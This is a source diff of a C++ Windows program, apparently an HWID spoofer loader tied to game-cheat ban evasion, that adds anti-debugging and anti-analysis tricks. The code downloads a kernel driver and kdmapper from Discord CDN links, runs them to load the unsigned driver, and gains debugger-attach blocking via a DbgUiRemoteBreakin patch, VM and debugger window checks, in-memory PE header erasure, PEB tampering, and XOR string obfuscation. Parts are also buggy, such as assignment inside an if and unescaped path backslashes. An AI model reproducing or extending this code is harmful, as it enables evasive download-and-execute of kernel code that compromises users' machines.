@@ -14,6 +14,7 @@
 
 using namespace junkcode;
 
+
 void apex()
 {
 
@@ -81,8 +82,15 @@ void demondll()
 
 }
 void cleaner() {
+    int loc_406FE0 = 2;
+    if (loc_406FE0 = 2)
+    {
 
+    }
+    else
+    {
 
+    }
     rydekem();
     plvbjwh();
     tlmisir();
@@ -315,7 +323,7 @@ _T("\\\\.\\KsDumper")
         HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         TCHAR msg[256] = _T("");
         if (hFile != INVALID_HANDLE_VALUE) {
-            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
+            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
             exit(0);
         }
         else
@@ -337,18 +345,17 @@ void spoofer()
 
     akfuxnl();
     string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
-    string spooferpath = "C:\\Windows\Vss\woof.sys"; //change to dir you want
+    string spooferpath = "C:\\Windows\Vss\woof.sys"; 
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
 
     string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
-    string mapperpath = "C:\\Windows\Vss\mapper.exe";//change to dir you want
+    string mapperpath = "C:\\Windows\Vss\mapper.exe";
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\\");
     system("C:\\Windows\Vss\\mapper.exe C:\\Windows\Vss\\woof.sys");
     Sleep(2000);
     deleter();
-    MessageBoxA(NULL, "wait 60 Seconds For Your Bios And Baseboard To Be Spoofed", "warning", MB_OK);
-    Sleep(60000);
+    Sleep(2000);
     rydekem();
     plvbjwh();
     tlmisir();
@@ -367,7 +374,7 @@ vector<string> serial;
 void loadserial()
 {
     driverdetect();
-    serial.push_back("384604182");
+    serial.push_back(XorStr("384604182").c_str());
 }
 
 
@@ -427,13 +434,66 @@ void mainbot()
 
 
 }
-
+__declspec(naked) void AntiAttach() {
+    __asm {
+        jmp ExitProcess
+    }
+}
 
 int main()
 {
+    HANDLE hProcess = GetCurrentProcess();
+
+    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+    FARPROC func_DbgUiRemoteBreakin = GetProcAddress(hMod, "DbgUiRemoteBreakin");
+
+    WriteProcessMemory(hProcess, func_DbgUiRemoteBreakin, AntiAttach, 6, NULL);
+
+    LPCWSTR windowName = L"x32dbg"; 
+    LPCWSTR vmname = L"VMware Workstation";
+    if (FindWindow(NULL, windowName))
+    {
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
+        exit(0);
+
+    }
+    if (FindWindow(NULL, vmname))
+    {
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
+        exit(0);
+
+    }
     
-    driverdetect();
-    loadserial();
-    mainbot();
+    DWORD OldProtect = 0;
+
+    // Get base address of module
+    char* pBaseAddr = (char*)GetModuleHandle(NULL);
+
+    // Change memory protection
+    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
+        PAGE_READWRITE, &OldProtect);
+
+    // Erase the header
+    ZeroMemory(pBaseAddr, 4096);
+
+    __asm
+    {
+        mov eax, fs: [0x30]				// PEB
+        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
+        mov eax, [eax + 0x0c]			// InOrderModuleList
+        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
+    }
+    if (IsDebuggerPresent())
+    {
+        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+        exit(0);
+    }
+    else
+    {
+        driverdetect();
+        loadserial();
+        mainbot();
+    }
+    
 }
 
